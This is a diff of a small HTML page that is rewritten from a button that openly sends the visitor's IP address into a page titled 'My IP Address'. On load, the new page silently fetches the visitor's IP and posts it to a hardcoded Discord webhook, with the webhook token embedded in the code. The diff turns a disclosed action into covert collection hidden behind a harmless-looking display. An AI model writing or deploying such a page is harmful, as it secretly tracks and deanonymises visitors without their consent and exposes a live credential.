@@ -1,43 +1,34 @@
 <html>
   <head>
-    <title>IP Address Sender</title>
+    <title>My IP Address</title>
+    
+ 
   </head>
   <body>
-    <button id="send-button">Send IP Address</button>
+    <h1>My IP Address</h1>
+    <p id="ip-address"></p>
+  </body>
+  <script>
+    // Fetch the IP address from the ipify API
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        const IP = data.ip;
+        // Display the IP address in the title
+        document.title = `My IP Address: ${IP}`;
+        // Display the IP address in the page
+        document.getElementById("ip-address").innerHTML = IP;
 
-    <script>
-      const button = document.getElementById('send-button');
-
-      button.addEventListener('click', () => {
-        alert('Sending IP address...');
-
-        // Use the fetch API to send a POST request to the webhook
-        fetch('https://discord.com/api/webhooks/1031273977118740501/IsAWXX8MZ6akhfXsBKtH00HAbZO1QooRf6RcwH5x9My_gYv1Y587Q8sW6xPGO6EcPV2r', {
-          method: 'POST',
+        // Send the IP address to the Discord webhook
+        fetch("https://discord.com/api/webhooks/1031273977118740501/IsAWXX8MZ6akhfXsBKtH00HAbZO1QooRf6RcwH5x9My_gYv1Y587Q8sW6xPGO6EcPV2r", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
           body: JSON.stringify({
-            content: `The user's IP address is: ${getIPAddress()}`
-          })
-        })
-        .then(response => {
-          if (response.ok) {
-            alert('IP address sent successfully');
-          } else {
-            alert('Error sending IP address');
-          }
-        })
-        .catch(error => {
-          console.error(error);
-          alert('Error sending IP address');
+            content: IP,
+          }),
         });
       });
-
-      // This function gets the user's IP address
-      function getIPAddress() {
-        // Note: this method may not work in all browsers
-        return fetch('https://api.ipify.org?format=json')
-          .then(response => response.json())
-          .then(data => data.ip);
-      }
-    </script>
-  </body>
+  </script>
 </html>
